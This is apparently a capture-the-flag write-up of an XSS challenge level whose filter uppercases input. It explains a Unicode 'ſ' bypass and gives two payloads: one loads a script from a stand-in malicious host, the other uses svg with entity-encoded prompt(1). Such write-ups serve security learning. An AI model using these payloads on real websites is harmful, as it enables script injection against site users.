This level will turn everything to uppercase and replace strings which seems like a starting tag to something else.

We need to use other tags here to achieve XSS, but the filter has stopped us.
What I learned here is that we can bypass the filter by abusing `toUpperCase()` function.

The function will turn every character to their uppercase equivalent which listed in Unicode Character Database.

But I didn't find a way to list the equivalents efficiently.

According to the write-ups, the character "ſ" will be transformed to "S" when it's put into `toUpperCase()` function.

And we can exploit that to create `<script>` tag since html isn't case-sensitive.

Here comes the second challenge, the contents in tags are also turn into uppercase.
As far as I know, there are two ways to get XSS here:
1. Create a `<script>` tag and set `src` to external evil site to load malicious js file, since URLs are case-insensitive.
2. Use `<svg>` again, because the content of `<script>` tag can be XML Entity Encoded, and it doesn't matter if the "X" is uppercase.

Payload 1:
```html
<!-- ſ is already tranformed -->
<ſCRIPT SRC="HTTPS://MALICIOUS.COM/EVIL.JS"></SCRIPT>
```

Payload 2:
```javascript
<!-- The entities are 'prompt(1)', and the <svg> tag is automatically ended by browser. -->
<ſVG><ſCRIPT>&#x70;&#x72;&#x6F;&#x6D;&#x70;&#x74;&#x28;&#x31;&#x29;</SCRIPT>
```